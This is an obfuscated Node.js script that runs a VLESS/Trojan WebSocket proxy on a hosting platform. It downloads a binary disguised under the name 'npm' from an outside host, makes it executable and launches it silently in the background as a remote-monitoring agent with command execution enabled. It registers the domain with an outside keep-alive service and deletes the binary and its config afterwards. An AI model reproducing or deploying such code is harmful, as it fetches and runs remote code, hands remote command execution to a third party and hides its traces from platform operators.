const _0x4a34de=_0x21f6;(function(_0x26f7d5,_0x4c829c){const _0x2e18ec=_0x21f6,_0x5926b5=_0x26f7d5();while(!![]){try{const _0x2eab5b=parseInt(_0x2e18ec(0x14d))/0x1*(parseInt(_0x2e18ec(0x162))/0x2)+parseInt(_0x2e18ec(0x195))/0x3+-parseInt(_0x2e18ec(0x16c))/0x4+-parseInt(_0x2e18ec(0x1a7))/0x5+-parseInt(_0x2e18ec(0x194))/0x6*(parseInt(_0x2e18ec(0x15f))/0x7)+parseInt(_0x2e18ec(0x191))/0x8+-parseInt(_0x2e18ec(0x178))/0x9*(-parseInt(_0x2e18ec(0x182))/0xa);if(_0x2eab5b===_0x4c829c)break;else _0x5926b5['push'](_0x5926b5['shift']());}catch(_0xdcdc97){_0x5926b5['push'](_0x5926b5['shift']());}}}(_0x2ad7,0x7c151));const os=require('os'),http=require(_0x4a34de(0x1a5)),fs=require('fs'),axios=require('axios'),net=require(_0x4a34de(0x177)),path=require(_0x4a34de(0x1a8)),crypto=require(_0x4a34de(0x172)),{Buffer}=require(_0x4a34de(0x171)),{exec,execSync}=require(_0x4a34de(0x18f)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x4a34de(0x186)]||_0x4a34de(0x16f),NEZHA_SERVER=process['env'][_0x4a34de(0x1c2)]||'',NEZHA_PORT=process[_0x4a34de(0x176)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4a34de(0x176)][_0x4a34de(0x1a2)]||'',DOMAIN=process[_0x4a34de(0x176)][_0x4a34de(0x1c5)]||'1234.abc.com',AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x4a34de(0x176)][_0x4a34de(0x198)]||UUID[_0x4a34de(0x1bd)](0x0,0x8),SUB_PATH=process[_0x4a34de(0x176)][_0x4a34de(0x1b5)]||_0x4a34de(0x1b9),NAME=process[_0x4a34de(0x176)][_0x4a34de(0x189)]||'Hug',PORT=process['env'][_0x4a34de(0x1a1)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5d0244=_0x4a34de;try{const _0x2b9a57=await axios[_0x5d0244(0x197)](_0x5d0244(0x17b)),_0x268671=_0x2b9a57[_0x5d0244(0x1b8)];ISP=(_0x268671['country']+'-'+_0x268671[_0x5d0244(0x1c6)])[_0x5d0244(0x188)](/ /g,'_');}catch(_0x5e9260){ISP=_0x5d0244(0x1ab);}};GetISP();function _0x2ad7(){const _0x211390=['type','20rXPHMg','connect','https://dns.google/resolve?name=','Failed\x20to\x20resolve\x20','stream','join','createServer','https://','Server\x20is\x20running\x20on\x20port\x20','hex','3852268HegWOX','arch','close','3bf65232-afd3-3754-9e91-4ab8c2ce364c','chmod\x20+x\x20npm','buffer','crypto','2083','--tls','end','env','net','288135iGcEIs','text/plain','https://amd64.ssss.nyc.mn/v1','https://speed.cloudflare.com/meta','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','once','writeHead','find','Server','message','420ZVTaWL','npm\x20is\x20already\x20running,\x20skip\x20running...','npm\x20running\x20error:','https://arm64.ssss.nyc.mn/agent','UUID','trim','replace','NAME','error','text/html','pop','unlink','application/dns-json','child_process','https://oooo.serv00.net/add-url','7350800TAJUhD','trojan://','https://amd64.ssss.nyc.mn/agent','340014MtCLVK','2226018BHhgOv','createHash','get','WSPATH','connection','sha224','base64','setsid\x20nohup\x20./npm\x20-s\x20','includes','8443','pipe','url','PORT','NEZHA_KEY','send','test','http','split','4469605tfUpsr','path','arm64','digest','Unknown','&path=%2F','reduce','write','aarch64','Automatic\x20Access\x20Task\x20added\x20successfully','2053','index.html','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1.1.1.1','SUB_PATH','readUInt8','\x20with\x20all\x20DNS\x20servers','data','sub',':443?encryption=none&security=tls&sni=','npm\x20download\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','slice','/bin/bash','from','utf8','length','NEZHA_SERVER','log','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','DOMAIN','asOrganization','catch','readUInt16BE','map','config.yaml','9644NNyhFU','\x20-p\x20','writeFileSync','npm','concat','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','substr','443','&type=A','Not\x20Found\x0a','Status','Answer','every','2087','then',':443?security=tls&sni=','toString','listen','91CtHosf','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'];_0x2ad7=function(){return _0x211390;};return _0x2ad7();}const httpServer=http[_0x4a34de(0x168)]((_0x2d955b,_0x31d584)=>{const _0x3f8c41=_0x4a34de;if(_0x2d955b[_0x3f8c41(0x1a0)]==='/'){const _0x4635df=path['join'](__dirname,_0x3f8c41(0x1b2));fs['readFile'](_0x4635df,_0x3f8c41(0x1c0),(_0x5d14e3,_0x2c4a9a)=>{const _0x2b40cf=_0x3f8c41;if(_0x5d14e3){_0x31d584['writeHead'](0xc8,{'Content-Type':_0x2b40cf(0x18b)}),_0x31d584[_0x2b40cf(0x175)]('Hello\x20world!');return;}_0x31d584[_0x2b40cf(0x17e)](0xc8,{'Content-Type':_0x2b40cf(0x18b)}),_0x31d584[_0x2b40cf(0x175)](_0x2c4a9a);});return;}else{if(_0x2d955b[_0x3f8c41(0x1a0)]==='/'+SUB_PATH){const _0x547e13='vless://'+UUID+'@'+DOMAIN+_0x3f8c41(0x1ba)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3f8c41(0x1ac)+WSPATH+'#'+NAME+'-'+ISP,_0x1cd7b3=_0x3f8c41(0x192)+UUID+'@'+DOMAIN+_0x3f8c41(0x15c)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x4c5a33=_0x547e13+'\x0a'+_0x1cd7b3,_0x9ead42=Buffer[_0x3f8c41(0x1bf)](_0x4c5a33)[_0x3f8c41(0x15d)](_0x3f8c41(0x19b));_0x31d584[_0x3f8c41(0x17e)](0xc8,{'Content-Type':_0x3f8c41(0x179)}),_0x31d584[_0x3f8c41(0x175)](_0x9ead42+'\x0a');}else _0x31d584['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x31d584[_0x3f8c41(0x175)](_0x3f8c41(0x156));}}),wss=new WebSocket[(_0x4a34de(0x180))]({'server':httpServer}),uuid=UUID[_0x4a34de(0x188)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x4a34de(0x1b4)];function resolveHost(_0x4ceac3){return new Promise((_0x3a2e2d,_0x1279d2)=>{const _0xa732fd=_0x21f6;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xa732fd(0x1a4)](_0x4ceac3)){_0x3a2e2d(_0x4ceac3);return;}let _0x43a09e=0x0;function _0x401ad6(){const _0x274435=_0xa732fd;if(_0x43a09e>=DNS_SERVERS[_0x274435(0x1c1)]){_0x1279d2(new Error(_0x274435(0x165)+_0x4ceac3+_0x274435(0x1b7)));return;}const _0x601c11=DNS_SERVERS[_0x43a09e];_0x43a09e++;const _0x325503=_0x274435(0x164)+encodeURIComponent(_0x4ceac3)+_0x274435(0x155);axios['get'](_0x325503,{'timeout':0x1388,'headers':{'Accept':_0x274435(0x18e)}})[_0x274435(0x15b)](_0x1fa7a0=>{const _0x58cadc=_0x274435,_0xf265de=_0x1fa7a0[_0x58cadc(0x1b8)];if(_0xf265de[_0x58cadc(0x157)]===0x0&&_0xf265de['Answer']&&_0xf265de[_0x58cadc(0x158)]['length']>0x0){const _0x4f33ea=_0xf265de['Answer'][_0x58cadc(0x17f)](_0x4dbcff=>_0x4dbcff[_0x58cadc(0x161)]===0x1);if(_0x4f33ea){_0x3a2e2d(_0x4f33ea['data']);return;}}_0x401ad6();})[_0x274435(0x1c7)](_0x459492=>{_0x401ad6();});}_0x401ad6();});}function handleVlessConnection(_0x5e2cb2,_0x4958fc){const _0x3ff900=_0x4a34de,[_0x50f4b9]=_0x4958fc,_0x29043b=_0x4958fc['slice'](0x1,0x11);if(!_0x29043b[_0x3ff900(0x159)]((_0x57c769,_0x590956)=>_0x57c769==parseInt(uuid[_0x3ff900(0x153)](_0x590956*0x2,0x2),0x10)))return![];let _0xbb8044=_0x4958fc[_0x3ff900(0x1bd)](0x11,0x12)['readUInt8']()+0x13;const _0x3d2b10=_0x4958fc[_0x3ff900(0x1bd)](_0xbb8044,_0xbb8044+=0x2)[_0x3ff900(0x14a)](0x0),_0x1bfa68=_0x4958fc[_0x3ff900(0x1bd)](_0xbb8044,_0xbb8044+=0x1)[_0x3ff900(0x1b6)](),_0x3e3e9b=_0x1bfa68==0x1?_0x4958fc[_0x3ff900(0x1bd)](_0xbb8044,_0xbb8044+=0x4)['join']('.'):_0x1bfa68==0x2?new TextDecoder()['decode'](_0x4958fc[_0x3ff900(0x1bd)](_0xbb8044+0x1,_0xbb8044+=0x1+_0x4958fc[_0x3ff900(0x1bd)](_0xbb8044,_0xbb8044+0x1)[_0x3ff900(0x1b6)]())):_0x1bfa68==0x3?_0x4958fc[_0x3ff900(0x1bd)](_0xbb8044,_0xbb8044+=0x10)[_0x3ff900(0x1ad)]((_0x5bd62,_0x58615b,_0x4345a8,_0x19d254)=>_0x4345a8%0x2?_0x5bd62[_0x3ff900(0x151)](_0x19d254['slice'](_0x4345a8-0x1,_0x4345a8+0x1)):_0x5bd62,[])[_0x3ff900(0x14b)](_0x3341d7=>_0x3341d7[_0x3ff900(0x14a)](0x0)['toString'](0x10))[_0x3ff900(0x167)](':'):'';_0x5e2cb2[_0x3ff900(0x1a3)](new Uint8Array([_0x50f4b9,0x0]));const _0x257bea=createWebSocketStream(_0x5e2cb2);return resolveHost(_0x3e3e9b)[_0x3ff900(0x15b)](_0x193465=>{const _0x41f012=_0x3ff900;net[_0x41f012(0x163)]({'host':_0x193465,'port':_0x3d2b10},function(){const _0x482b49=_0x41f012;this[_0x482b49(0x1ae)](_0x4958fc[_0x482b49(0x1bd)](_0xbb8044)),_0x257bea['on'](_0x482b49(0x18a),()=>{})['pipe'](this)['on'](_0x482b49(0x18a),()=>{})[_0x482b49(0x19f)](_0x257bea);})['on']('error',()=>{});})[_0x3ff900(0x1c7)](_0x8cf3fc=>{const _0x405c8c=_0x3ff900;net[_0x405c8c(0x163)]({'host':_0x3e3e9b,'port':_0x3d2b10},function(){const _0x448e7b=_0x405c8c;this[_0x448e7b(0x1ae)](_0x4958fc[_0x448e7b(0x1bd)](_0xbb8044)),_0x257bea['on'](_0x448e7b(0x18a),()=>{})[_0x448e7b(0x19f)](this)['on'](_0x448e7b(0x18a),()=>{})[_0x448e7b(0x19f)](_0x257bea);})['on'](_0x405c8c(0x18a),()=>{});}),!![];}function _0x21f6(_0x224076,_0x5b1892){_0x224076=_0x224076-0x14a;const _0x2ad794=_0x2ad7();let _0x21f671=_0x2ad794[_0x224076];return _0x21f671;}function handleTrojanConnection(_0x33f1fa,_0x431b8e){const _0x47f9ea=_0x4a34de;try{if(_0x431b8e[_0x47f9ea(0x1c1)]<0x3a)return![];const _0xa45337=_0x431b8e[_0x47f9ea(0x1bd)](0x0,0x38)[_0x47f9ea(0x15d)](),_0x8c7cc5=[UUID];let _0x3ac3f1=null;for(const _0x24da7e of _0x8c7cc5){const _0x10353c=crypto[_0x47f9ea(0x196)](_0x47f9ea(0x19a))['update'](_0x24da7e)[_0x47f9ea(0x1aa)](_0x47f9ea(0x16b));if(_0x10353c===_0xa45337){_0x3ac3f1=_0x24da7e;break;}}if(!_0x3ac3f1)return![];let _0x41c060=0x38;_0x431b8e[_0x41c060]===0xd&&_0x431b8e[_0x41c060+0x1]===0xa&&(_0x41c060+=0x2);const _0x248f9a=_0x431b8e[_0x41c060];if(_0x248f9a!==0x1)return![];_0x41c060+=0x1;const _0x9bb94=_0x431b8e[_0x41c060];_0x41c060+=0x1;let _0x1f2bc0,_0x20586e;if(_0x9bb94===0x1)_0x1f2bc0=_0x431b8e['slice'](_0x41c060,_0x41c060+0x4)[_0x47f9ea(0x167)]('.'),_0x41c060+=0x4;else{if(_0x9bb94===0x3){const _0x20b734=_0x431b8e[_0x41c060];_0x41c060+=0x1,_0x1f2bc0=_0x431b8e[_0x47f9ea(0x1bd)](_0x41c060,_0x41c060+_0x20b734)[_0x47f9ea(0x15d)](),_0x41c060+=_0x20b734;}else{if(_0x9bb94===0x4)_0x1f2bc0=_0x431b8e['slice'](_0x41c060,_0x41c060+0x10)[_0x47f9ea(0x1ad)]((_0x3f144a,_0x5ca09f,_0x318663,_0x26522f)=>_0x318663%0x2?_0x3f144a[_0x47f9ea(0x151)](_0x26522f[_0x47f9ea(0x1bd)](_0x318663-0x1,_0x318663+0x1)):_0x3f144a,[])[_0x47f9ea(0x14b)](_0x2813a3=>_0x2813a3[_0x47f9ea(0x14a)](0x0)[_0x47f9ea(0x15d)](0x10))[_0x47f9ea(0x167)](':'),_0x41c060+=0x10;else return![];}}_0x20586e=_0x431b8e['readUInt16BE'](_0x41c060),_0x41c060+=0x2;_0x41c060<_0x431b8e['length']&&_0x431b8e[_0x41c060]===0xd&&_0x431b8e[_0x41c060+0x1]===0xa&&(_0x41c060+=0x2);const _0x17509c=createWebSocketStream(_0x33f1fa);return resolveHost(_0x1f2bc0)[_0x47f9ea(0x15b)](_0x221b23=>{const _0x2fb67f=_0x47f9ea;net[_0x2fb67f(0x163)]({'host':_0x221b23,'port':_0x20586e},function(){const _0x54dbf1=_0x2fb67f;_0x41c060<_0x431b8e['length']&&this['write'](_0x431b8e['slice'](_0x41c060)),_0x17509c['on'](_0x54dbf1(0x18a),()=>{})[_0x54dbf1(0x19f)](this)['on'](_0x54dbf1(0x18a),()=>{})[_0x54dbf1(0x19f)](_0x17509c);})['on'](_0x2fb67f(0x18a),()=>{});})[_0x47f9ea(0x1c7)](_0x5836fc=>{net['connect']({'host':_0x1f2bc0,'port':_0x20586e},function(){const _0x550678=_0x21f6;_0x41c060<_0x431b8e[_0x550678(0x1c1)]&&this[_0x550678(0x1ae)](_0x431b8e[_0x550678(0x1bd)](_0x41c060)),_0x17509c['on'](_0x550678(0x18a),()=>{})['pipe'](this)['on'](_0x550678(0x18a),()=>{})[_0x550678(0x19f)](_0x17509c);})['on']('error',()=>{});}),!![];}catch(_0x2684f7){return![];}}wss['on'](_0x4a34de(0x199),(_0x2773d6,_0x219c37)=>{const _0x58328f=_0x4a34de,_0x11454d=_0x219c37[_0x58328f(0x1a0)]||'';_0x2773d6[_0x58328f(0x17d)](_0x58328f(0x181),_0x15252e=>{const _0x3e4f27=_0x58328f;if(_0x15252e[_0x3e4f27(0x1c1)]>0x11&&_0x15252e[0x0]===0x0){const _0x57b436=_0x15252e[_0x3e4f27(0x1bd)](0x1,0x11),_0x360127=_0x57b436[_0x3e4f27(0x159)]((_0xcdb491,_0x34839d)=>_0xcdb491==parseInt(uuid[_0x3e4f27(0x153)](_0x34839d*0x2,0x2),0x10));if(_0x360127){!handleVlessConnection(_0x2773d6,_0x15252e)&&_0x2773d6[_0x3e4f27(0x16e)]();return;}}!handleTrojanConnection(_0x2773d6,_0x15252e)&&_0x2773d6[_0x3e4f27(0x16e)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x15e383=_0x4a34de,_0x34c792=os[_0x15e383(0x16d)]();return _0x34c792==='arm'||_0x34c792===_0x15e383(0x1a9)||_0x34c792===_0x15e383(0x1af)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x15e383(0x185):!NEZHA_PORT?_0x15e383(0x17a):_0x15e383(0x193);},downloadFile=async()=>{const _0x368de1=_0x4a34de;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5f41b5=getDownloadUrl(),_0x7b4239=await axios({'method':_0x368de1(0x197),'url':_0x5f41b5,'responseType':_0x368de1(0x166)}),_0x266f07=fs['createWriteStream'](_0x368de1(0x150));return _0x7b4239[_0x368de1(0x1b8)][_0x368de1(0x19f)](_0x266f07),new Promise((_0x4b6a3e,_0x5a8ec4)=>{const _0x1f6fc3=_0x368de1;_0x266f07['on']('finish',()=>{const _0x7fdd00=_0x21f6;console[_0x7fdd00(0x1c3)](_0x7fdd00(0x1bb)),exec(_0x7fdd00(0x170),_0x3dbf67=>{if(_0x3dbf67)_0x5a8ec4(_0x3dbf67);_0x4b6a3e();});}),_0x266f07['on'](_0x1f6fc3(0x18a),_0x5a8ec4);});}catch(_0x316bd1){throw _0x316bd1;}},runnz=async()=>{const _0x519802=_0x4a34de;try{const _0x12c682=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x12c682[_0x519802(0x187)]()!==''){console[_0x519802(0x1c3)](_0x519802(0x183));return;}}catch(_0x524a64){}await downloadFile();let _0x2c690f='',_0x23781f=[_0x519802(0x154),_0x519802(0x19e),'2096',_0x519802(0x15a),_0x519802(0x173),_0x519802(0x1b1)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x25e22d=_0x23781f[_0x519802(0x19d)](NEZHA_PORT)?_0x519802(0x174):'';_0x2c690f=_0x519802(0x19c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x519802(0x14e)+NEZHA_KEY+'\x20'+_0x25e22d+_0x519802(0x1bc);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x144ce2=NEZHA_SERVER[_0x519802(0x19d)](':')?NEZHA_SERVER[_0x519802(0x1a6)](':')[_0x519802(0x18c)]():'',_0x323f31=_0x23781f['includes'](_0x144ce2)?'true':'false',_0x56dd2e='client_secret:\x20'+NEZHA_KEY+_0x519802(0x160)+NEZHA_SERVER+_0x519802(0x1c4)+_0x323f31+_0x519802(0x1b3)+UUID;fs[_0x519802(0x14f)](_0x519802(0x14c),_0x56dd2e);}_0x2c690f=_0x519802(0x17c);}else{console[_0x519802(0x1c3)](_0x519802(0x152));return;}}try{exec(_0x2c690f,{'shell':_0x519802(0x1be)},_0x46a1b4=>{const _0xa457db=_0x519802;if(_0x46a1b4)console[_0xa457db(0x18a)](_0xa457db(0x184),_0x46a1b4);else console['log']('npm\x20is\x20running');});}catch(_0x4937f5){console[_0x519802(0x18a)]('error:\x20'+_0x4937f5);}};async function addAccessTask(){const _0x1039fe=_0x4a34de;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x433c18=_0x1039fe(0x169)+DOMAIN;try{const _0x3d9779=await axios['post'](_0x1039fe(0x190),{'url':_0x433c18},{'headers':{'Content-Type':'application/json'}});console[_0x1039fe(0x1c3)](_0x1039fe(0x1b0));}catch(_0x156321){}}const delFiles=()=>{const _0x7e12c9=_0x4a34de;fs[_0x7e12c9(0x18d)](_0x7e12c9(0x150),()=>{}),fs[_0x7e12c9(0x18d)](_0x7e12c9(0x14c),()=>{});};httpServer[_0x4a34de(0x15e)](PORT,()=>{const _0x4c4506=_0x4a34de;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x4c4506(0x16a)+PORT);});
